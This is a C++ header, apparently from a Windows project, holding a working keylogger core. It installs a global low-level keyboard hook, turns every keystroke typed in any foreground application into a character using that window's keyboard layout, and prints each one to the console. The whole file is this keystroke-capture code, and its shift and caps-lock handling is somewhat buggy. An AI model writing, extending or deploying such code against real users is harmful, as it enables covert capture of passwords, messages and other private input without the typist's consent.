#pragma once
#pragma warning(disable : 4706)

#include <cctype>
#include <cstdint>
#include <sstream>
#include <iostream>
#include "../include/keys.hpp"

namespace detail
{
  void handle_vk_code(
    int vk_code,
    int& key, 
    HKL kbd_layout
  )
  {
    bool is_lc = ((GetAsyncKeyState(VK_CAPITAL) & 1) != 0);

    if ( (GetAsyncKeyState(VK_SHIFT) & 1) != 0
      || (GetAsyncKeyState(VK_LSHIFT) & 1) != 0
      || (GetAsyncKeyState(VK_RSHIFT) & 1) != 0 )
    {
      is_lc = !is_lc;
    }

    key = MapVirtualKeyExA(
      vk_code,
      MAPVK_VK_TO_CHAR,
      kbd_layout
    );

    if ( !is_lc )
      key = ::tolower(key);
  }

  void show_vk_input(
    int vk_code
  )
  {
    HKL kbd_layout{};
    uint32_t thread_id{};
    HWND h_fg_window = GetForegroundWindow();
    
    if ( h_fg_window )
    {
      thread_id = GetWindowThreadProcessId(
        h_fg_window,
        nullptr
      );
      kbd_layout = GetKeyboardLayout(
        thread_id
      );
    }

    std::stringstream ss;
    if ( vk_storage.find(vk_code)
      != vk_storage.end() )
    {
      ss << vk_storage.at(vk_code);
    }
    else
    {
      int key{};
      handle_vk_code(
        vk_code, 
        key, 
        kbd_layout
      );
      ss << static_cast<char>(key);
    }
    std::cout << ss.str();  
    std::cout.flush();
  }
}

#ifdef __cplusplus
extern "C" {
#endif

  __declspec(dllexport) int64_t __stdcall hook_callback(
    int32_t n_code,
    uintptr_t w_param,
    int64_t l_param
  );

#ifdef __cplusplus
}
#endif

typedef struct __kbd_hook_t
{
  explicit __kbd_hook_t()
    : msg(), hook(nullptr)
  {
    set_hook();
  }

  static __kbd_hook_t& instance()
  {
    static __kbd_hook_t kh{};
    return kh;
  }

  MSG msg;
  HHOOK hook;

  __kbd_hook_t& set_hook()
  {
    if ( !(hook = SetWindowsHookEx(
      WH_KEYBOARD_LL,
      hook_callback,
      nullptr,
      0)) )
    {
      MessageBox(
        nullptr,
        L"set_hook() failed.",
        L"An error occurred",
        MB_ICONERROR
      );
    }
    return *this;
  }

  __kbd_hook_t& unhook()
  {
    UnhookWindowsHookEx(hook);
    return *this;
  }

  int get_messages()
  {
    while ( msg.message != WM_QUIT )
    {
      if ( PeekMessage(
        &msg,
        nullptr,
        0,
        0,
        PM_REMOVE) )
      {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
      }
    }
    unhook();
    return static_cast<int>(msg.wParam);
  }

} kbd_hook_t;

__declspec(dllexport) int64_t __stdcall hook_callback(
  int32_t n_code, 
  uintptr_t w_param, 
  int64_t l_param
)
{
  KBDLLHOOKSTRUCT kbd_struct = {0};
  if ( n_code == HC_ACTION )
  {
    switch ( w_param )
    {
      case WM_KEYDOWN:
      {
        kbd_struct = *reinterpret_cast<KBDLLHOOKSTRUCT*>(l_param);
        detail::show_vk_input(
          kbd_struct.vkCode
        );
      }      
    }
  }
  return CallNextHookEx(
    kbd_hook_t::instance().hook,
    n_code,
    w_param,
    l_param
  );
}